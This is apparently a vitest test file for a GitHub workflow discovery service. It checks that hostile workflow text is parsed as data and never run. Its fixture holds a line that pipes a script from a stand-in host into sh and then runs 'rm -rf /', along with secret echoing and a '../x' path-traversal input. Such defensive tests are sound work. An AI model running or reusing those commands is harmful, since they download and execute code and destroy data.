import { describe, expect, it } from "vitest";
import { buildApp } from "../src/app.ts";
import { openDb } from "../src/db.ts";
import { Store } from "../src/store.ts";
import { seedDemo } from "../src/seed.ts";
import type { FetchLike } from "../src/github-discovery.ts";

/** R02.3 read-only GitHub repository discovery with fixtures (no network). */
const hostile = `
name: deploy
on: [push, workflow_dispatch]
x: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: curl https://evil.example/x.sh | sh && rm -rf / # must never run or be kept
      - uses: ./.github/actions/local
  ship:
    environment: production
    steps:
      - run: echo "\${{ secrets.TOKEN }}"
  preview:
    environment: \${{ github.head_ref }}
`;
const b64 = (s: string) => Buffer.from(s).toString("base64");

function fixture(over: { repoName?: string; deploy403?: boolean; repo404?: boolean; workflows?: { id: number; path: string; name: string; text: string }[] } = {}): { fetch: FetchLike; calls: string[] } {
  const calls: string[] = [];
  const wfs = over.workflows ?? [{ id: 9001, path: ".github/workflows/deploy.yml", name: "deploy", text: hostile }];
  const res = (status: number, body: unknown, h: Record<string, string> = {}) => ({ status, ok: status < 400, json: async () => body, headers: { get: (k: string) => h[k.toLowerCase()] ?? null } });
  const fetch: FetchLike = async (url, init) => {
    calls.push(url);
    expect(init.headers.accept).toBe("application/vnd.github+json");
    const u = new URL(url);
    expect(u.hostname).toBe("api.github.com");
    const p = u.pathname.replace(/^\/repos\/acme\/shop/, "");
    if (over.repo404) return res(404, { message: "Not Found" });
    if (p === "") return res(200, { id: 4242, full_name: over.repoName ?? "acme/shop", default_branch: "main" });
    if (p === "/actions/workflows") return res(200, { workflows: wfs.map(({ text: _t, ...w }) => ({ ...w, state: "active" })) });
    const wf = wfs.find((w) => p === `/contents/${w.path}`);
    if (wf) return res(200, { content: b64(wf.text), encoding: "base64", size: wf.text.length });
    if (p === "/deployments") return over.deploy403 ? res(403, { message: "rate limit" }, { "x-ratelimit-remaining": "0" }) : res(200, [{ id: 1, environment: "production", sha: "abc123", ref: "main", created_at: "2026-10-20T10:00:00Z" }]);
    if (p === "/releases") return res(200, [{ id: 7, tag_name: "v1.2.0", created_at: "2026-10-19T10:00:00Z" }]);
    if (p === "/commits/main") return res(200, { sha: "abc123def456", commit: { committer: { date: "2026-10-20T09:00:00Z" } } });
    return res(404, {});
  };
  return { fetch, calls };
}

async function app(fetch: FetchLike) {
  const store = new Store(openDb(":memory:"));
  seedDemo(store);
  const admin = store.createToken("admin", "admin").token;
  const viewer = store.createToken("viewer", "viewer").token;
  const a = await buildApp({ store, secret: "s", demoMode: false, webDist: "/nonexistent", githubFetch: fetch });
  await a.inject({ method: "POST", url: "/api/projects", headers: { authorization: `Bearer ${admin}` }, payload: { id: "deliv", name: "Delivery", dataset_kind: "live" } });
  const post = (url: string, payload: unknown, t = admin) => a.inject({ method: "POST", url: `/api/projects/deliv${url}`, headers: { authorization: `Bearer ${t}` }, payload: payload as object });
  return { a, store, post, viewer };
}

describe("R02.3 repository discovery", () => {
  it("hostile workflow text is parsed as data: nothing runs and run: steps are not retained", async () => {
    const f = fixture();
    const { post } = await app(f.fetch);
    const p = (await post("/discovery/github/preview", { owner: "acme", repo: "shop" })).json();
    expect(p.metadata.workflows[0]).toMatchObject({ id: 9001, triggers: ["push", "workflow_dispatch"], environments: ["production"], uses: ["actions/checkout@v4", "./.github/actions/local"] });
    expect(JSON.stringify(p)).not.toMatch(/evil\.example|rm -rf|secrets\.TOKEN|curl/);
    expect(p.partial.map((x: { reason: string }) => x.reason)).toContain("environment computed from an expression; not resolved");
    expect(f.calls.every((u) => u.startsWith("https://api.github.com/repos/acme/shop"))).toBe(true);
    expect(p.unsupported.join(" ")).toMatch(/never retained or executed/);
  });

  it("preview reports additions, removals and uncertainty before anything is applied; apply needs the base revision", async () => {
    const { post, store } = await app(fixture({ deploy403: true }).fetch);
    const p = (await post("/discovery/github/preview", { owner: "acme", repo: "shop" })).json();
    expect(p.base_graph_revision).toBeNull();
    expect(p.additions.sort()).toEqual(["gh-env-4242-production", "gh-repo-4242", "gh-wf-9001"]);
    expect(p.partial).toContainEqual({ resource: "deployments", reason: "rate limited or forbidden (403): rate limit exhausted" });
    expect(store.getGraph("deliv")).toBeUndefined(); // preview applied nothing
    expect((await post("/discovery/github/apply", { preview_id: p.preview_id, expected_graph_revision: "other" })).statusCode).toBe(409);
    const ok = await post("/discovery/github/apply", { preview_id: p.preview_id, expected_graph_revision: null });
    expect(ok.statusCode, ok.body).toBe(200);
    expect(store.getGraph("deliv")!.assets.map((x) => x.id).sort()).toEqual(p.additions.sort());
  });

  it("renames and redeploys keep stable ids; a removed workflow is shown as a removal", async () => {
    const first = await app(fixture().fetch);
    const p1 = (await first.post("/discovery/github/preview", { owner: "acme", repo: "shop" })).json();
    await first.post("/discovery/github/apply", { preview_id: p1.preview_id, expected_graph_revision: null });
    const rev = first.store.getGraph("deliv")!.graph_revision;
    // same store, renamed repository and the workflow file replaced by a new one
    const f2 = fixture({ repoName: "acme/shop-renamed", workflows: [{ id: 9002, path: ".github/workflows/ci.yml", name: "ci", text: "on: push\njobs: {}\n" }] });
    const second = await buildApp({ store: first.store, secret: "s", demoMode: false, webDist: "/nonexistent", githubFetch: f2.fetch });
    const admin = first.store.createToken("admin2", "admin").token;
    const p2 = (await second.inject({ method: "POST", url: "/api/projects/deliv/discovery/github/preview", headers: { authorization: `Bearer ${admin}` }, payload: { owner: "acme", repo: "shop" } })).json();
    expect(p2.base_graph_revision).toBe(rev);
    expect(p2.changes).toContain("gh-repo-4242"); // same id, new name
    expect(p2.additions).toEqual(["gh-wf-9002"]);
    expect(p2.removals).toEqual(["gh-wf-9001"]);
  });

  it("an inaccessible repository is reported, not treated as empty; only admins may discover", async () => {
    const { post, viewer } = await app(fixture({ repo404: true }).fetch);
    const r = await post("/discovery/github/preview", { owner: "acme", repo: "shop" });
    expect(r.statusCode).toBe(502);
    expect(r.json().partial[0]).toMatchObject({ resource: "repository", status: 404 });
    expect((await post("/discovery/github/preview", { owner: "acme", repo: "shop" }, viewer)).statusCode).toBe(403);
    expect((await post("/discovery/github/preview", { owner: "../x", repo: "shop" })).statusCode).toBe(400);
  });
});
